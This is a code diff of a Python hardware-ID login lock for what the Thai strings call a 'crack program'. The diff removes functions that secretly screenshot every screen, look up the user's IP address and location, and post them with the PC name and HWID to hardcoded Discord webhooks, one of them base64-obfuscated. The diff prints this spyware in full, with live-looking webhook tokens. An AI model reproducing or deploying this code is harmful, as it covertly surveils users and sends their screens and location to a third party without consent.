@@ -21,114 +21,24 @@ def gethwid():
     blist = json.dumps(blist, ensure_ascii=False).encode('utf-8')
     blist = b'PRP' + base64.b64encode(blist)
     return blist.decode('UTF-8')
-datahwidreg = httpx.get("https://pastebin.com/raw/AsmGzNHk")
+def datahwidreg() -> str:
+    http = urllib3.PoolManager()
+    response = http.request('GET', 'https://pastebin.com/raw/AsmGzNHk')
+    return response.data.decode()
+
 new_hwid = generate_hwid()[:8]
 new_cpu = generate_cpu()[:8]
 hw = gethwid()[:15]
 mypcname = os.getlogin()
 hwid = f'''{hw}-{mypcname}-{new_hwid}{new_cpu}'''
-ipinfo = httpx.get("https://ipinfo.io/json")
-ipinfojson = ipinfo.json()
-ip = ipinfojson.get('ip')
-city = ipinfojson.get('city')
-country = ipinfojson.get('country')
-region = ipinfojson.get('region')
-org = ipinfojson.get('org')
-loc = ipinfojson.get('loc')
 
-webhookusercanlogin = f"https://discordapp.com/api/webhooks/1076085546411098153/2QIJFXrE-HUuVKm7PZZyiSXqY0TPTyV7YvQFEKp06TmsHO7GfGK580t-2i_PrT91Gen_"
-webhook_url = "https://discordapp.com/api/webhooks/1076085546411098153/2QIJFXrE-HUuVKm7PZZyiSXqY0TPTyV7YvQFEKp06TmsHO7GfGK580t-2i_PrT91Gen_"
-webhookusercantlogin_encoded_string = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3MjA4NzU1NjQ4MjY2NjU0Ni9aZkt4Zk9VWmxaZTFkaXhBRmhhSnZ3Q0pMaWhncmR3b1BXRnNPNTF2M3RFWUJHcG9UYTNKU00ybHR1QlJ6MnVIcUpjRw=='
-webhookusercantlogin_decoded_string = base64.b64decode(webhookusercantlogin_encoded_string).decode('utf-8')
-webhookusercantlogin = webhookusercantlogin_decoded_string
-usercanlogin = f"คุณ {mypcname} ได้เข้าระบบสำเร็จ" 
-usercantlogin = f"คุณ {mypcname} ได้เข้าระบบไม่สำเร็จ" 
-projectname = "แคร็กโปรแกรม"
-versionproject = "1"
-
-def loginpass():
-    image = ImageGrab.grab(bbox=None, include_layered_windows=True, all_screens=True, xdisplay=None)
-    image_bytes = io.BytesIO()
-    image.save(image_bytes, format='PNG')
-    image_bytes.seek(0)
-
-    # Encode image bytes to base64
-    image_base64 = base64.b64encode(image_bytes.read()).decode()
-
-    # Set the image URL to a data URL
-    image_url = f"data:image/png;base64,{image_base64}"
-
-    # Post the webhook
-    response = requests.post(
-        webhook_url,
-        json={
-            "content": "",
-            "embeds": [
-                {
-                    "title": f"User: {mypcname}",
-                    "description": f"""Project: {projectname}
-                    Version: {versionproject}
-                    Status: เข้าระบบสำเร็จ
-                    HWID: {hwid}
-                    IP: {ip}
-                    เมือง: {city}
-                    ประเทศ: {country}
-                    ภูมิภาค: {region}
-                    องค์กร: {org}
-                    โลเคชั่น: {loc}""",
-                    "color": 0x1cff00,
-                    "image": {"url": image_url},
-                }
-            ],
-            "username": usercanlogin,
-        }
-    )
-
-    # Check if the webhook was successful
-    if response.status_code == 204:
-        print("Webhook sent successfully.")
-    else:
-        print(f"Webhook failed with status code {response.status_code}.")
-def loginfaill():
-    image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
-    image.save("imageprpsecurity.png")
-    webhookusercantloginpic = DiscordWebhook(webhookusercantlogin, username=usercantlogin)
-    with open("imageprpsecurity.png", "rb") as f:
-        webhookusercantloginpic.add_file(file=f.read(), filename='imageprpsecurity.png')
-    os.remove("imageprpsecurity.png")
-    httpx.post(
-            webhookusercantlogin, json={
-            "content":"",
-            "embeds": [
-            {
-              "title": f"User : {mypcname}",
-              "tts": False,
-              "description": f"""Project : {projectname} 
-                Version : {versionproject} 
-                Status : เข้าไม่ระบบสำเร็จ 
-                HWID : {hwid}
-                IP : {ip}
-                เมือง : {city}
-                ประเทศ : {country}
-                ภูมิภาค : {region}
-                องค์กร : {org}
-                โลเคชั่น : {loc}""",
-              "color": 0xcf0a0a,
-            }
-          ],
-          "username": usercantlogin,
-          }
-        )
-    response = webhookusercantloginpic.execute()
 
 def loginsus():
-    if hwid in datahwidreg.text:
-        loginpass()
-        print(loginpass)
+    hwid_data = datahwidreg()
+    if hwid in hwid_data:
         import file.hwid
         window.title(f"PRP Test LOCKHWID | User : {mypcname} | Status : Succeed | ✅ ")
     else:
-        loginfaill()
         messagebox.showerror("Login Failed", "ไม่พบ HWID")
         window.title(f"PRP Test LOCKHWID | User : {mypcname} | Status : Failed | ❌ ")
 
